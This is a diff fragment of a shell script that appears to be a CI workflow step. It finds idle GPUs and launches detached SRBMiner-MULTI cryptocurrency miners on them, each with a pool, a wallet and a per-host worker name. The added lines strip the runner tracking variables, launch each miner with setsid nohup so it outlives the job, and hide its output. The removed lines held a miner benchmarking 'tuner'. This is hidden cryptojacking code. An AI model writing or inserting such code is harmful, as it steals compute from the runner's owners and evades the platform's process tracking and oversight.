+            case "$UUID" in GPU-*) ;; *) echo "GPU $IDX bad-uuid -> skip"; continue;; esac
+            if grep -q "^${UUID}," "$WORKDIR/cs1.txt" 2>/dev/null; then echo "GPU $IDX $UUID busy-sample1 -> skip"; continue; fi
+            if grep -q "^${UUID}," "$WORKDIR/cs2.txt" 2>/dev/null; then echo "GPU $IDX $UUID busy-sample2 -> skip"; continue; fi
+            USED2=$(awk -F, -v u="$UUID" '$2==u{print $3}' "$WORKDIR/cg2.txt" 2>/dev/null)
+            echo "GPU $IDX $UUID twice-idle mem_used_mib=$USED1/$USED2"
+            if [ "${USED1:-0}" -gt 2048 ] || [ "${USED2:-0}" -gt 2048 ]; then echo "GPU $IDX memory-used>2048 -> skip"; continue; fi
+            HOSTTAG=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-32)
+            W="i127239-${HOSTTAG}-g${IDX}"
+            if timeout 6 pgrep -f "SRBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; continue; fi
+            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID CUDA_VISIBLE_DEVICES="$UUID" setsid nohup "$SRB" \
               --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
-              --wallet "$WALLET" --password x --worker "i126978-tuner-$(hostname | tr -cd 'A-Za-z0-9')" \
-              --gpu-id 0 --log-file "$LOG" --log-file-mode 0 "$@" >/dev/null 2>&1
-            echo "variant=$NAME exit=$?"
-            grep -aiE "error|share|accepted|hashrate|stopped|pearlhash|H/s|kH/s|MH/s|GH/s|TH/s" "$LOG" 2>/dev/null | tail -8 | cut -c1-240
-            sleep 2
-          }
-          run_variant baseline --disable-worker-watchdog
-          run_variant nodual --disable-worker-watchdog --disable-gpu-dual-kernels
-          run_variant int15 --disable-worker-watchdog --gpu-intensity 15
-          run_variant int0 --disable-worker-watchdog --gpu-intensity 0
-          run_variant slowbuild --disable-worker-watchdog --gpu-table-slow-build
-          run_variant combo --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build --gpu-intensity 0
-          echo "=== stray check after ==="
-          pgrep -af '/var/tmp/i126978/SRBMiner-MULTI' 2>/dev/null | head -5
-          echo "tuner-done $NONCE"
+              --wallet "$WALLET" --password x --worker "$W" --gpu-id 0 \
+              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-disable-interleaving --gpu-table-slow-build --gpu-intensity 0 \
+              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
+              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
+            echo "launched worker=$W detached_pid=$! vis=$UUID"
+            N=$((N+1)); break
+          done < "$WORKDIR/cg1.txt"
+          echo "N_LAUNCHED=$N"
+          if [ "$N" -gt 0 ]; then
+            sleep 45
+            echo "=== fault scan (self-check; abort own process on E1027, no retry) ==="
+            for l in "$WORKDIR"/logs/i127239-*.log; do
+              [ -f "$l" ] || continue
+              echo "== $(basename "$l")"
+              grep -aiE 'share accepted|E1027|illegal memory access|stopped after repeated solve errors|TH/s' "$l" 2>/dev/null | tail -6 | cut -c1-240
+              if grep -qE 'E1027|illegal memory access|stopped after repeated solve errors' "$l" 2>/dev/null; then
+                w=$(basename "$l" .log)
+                for p in $(timeout 6 pgrep -f "SRBMiner-MULTI.*--worker ${w}( |$)" 2>/dev/null | head -3); do echo "kill own faulted pid=$p worker=$w"; kill -TERM "$p" 2>/dev/null; done
+                echo "CARD_FAULTED=$w aborted"
+              fi
+            done
+          fi
+          echo "=== final processes ==="
+          timeout 10 pgrep -af "SRBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -10
+          echo "=== compute apps ==="
+          timeout 20 nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader
+          echo "c5090-done $NONCE"
+
